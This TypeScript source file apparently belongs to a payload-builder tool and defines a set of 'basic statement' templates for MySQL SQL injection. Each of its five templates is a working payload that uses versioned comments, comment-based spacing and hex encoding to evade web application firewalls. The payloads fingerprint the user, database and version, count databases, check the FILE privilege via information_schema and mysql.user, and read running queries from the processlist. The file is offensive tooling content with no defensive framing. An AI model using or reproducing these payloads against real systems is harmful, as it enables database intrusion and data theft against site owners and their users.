import { BuilderSubcategory } from '../../types';

export const basicStatementsSubcategory: BuilderSubcategory = {
  id: 'basic-statements',
  label: 'Basic statements',
  description: 'WAF bypass foundational statements (User/DB/Version, Count DB, Privileges check I_S/mysql.user, Running query)',
  templates: [
    {
      id: 'waf-statement-user-database-version',
      name: 'USER(),DATABASE(),VERSION()',
      description: 'WAF bypass combined user, database, and version statement',
      content: '/*!50000CONCAT_WS*/(0x203a20,/*!50000USER*/(),/*!50000DATABASE*/(),/*!50000VERSION*/())'
    },
    {
      id: 'waf-statement-count-databases',
      name: 'Count() DATABASES',
      description: 'WAF bypass database count subquery',
      content: '(/*!50000SELECT*//**/COUNT(schema_name)/**/FROM/**/information_schema.schemata)'
    },
    {
      id: 'waf-statement-privileges-is',
      name: 'Privileges (via I_S.PRIVILEGES)',
      description: 'WAF bypass FILE privilege verification via information_schema.user_privileges',
      content: '(/*!50000SELECT*//**/IF(COUNT(*)>0,0x594553202846494c452050726976696c65676529,0x4e4f)/**/FROM/**/information_schema.user_privileges/**/WHERE/**/privilege_type=0x46494c45)'
    },
    {
      id: 'waf-statement-privileges-mysql-system',
      name: 'Privileges (via MySQL SYSTEM TABLE)',
      description: 'WAF bypass File_priv check directly from mysql.user system table',
      content: '(/*!50000SELECT*//**/File_priv/**/FROM/**/mysql.user/**/WHERE/**/user=SUBSTRING_INDEX(USER(),0x40,1)/**/LIMIT/**/1)'
    },
    {
      id: 'waf-statement-get-running-query',
      name: 'Get running query',
      description: 'WAF bypass active query inspection from processlist',
      content: '(/*!50000SELECT*//**/info/**/FROM/**/information_schema.processlist/**/WHERE/**/id!=connection_id()/**/ORDER/**/BY/**/time/**/DESC/**/LIMIT/**/1)'
    }
  ]
};
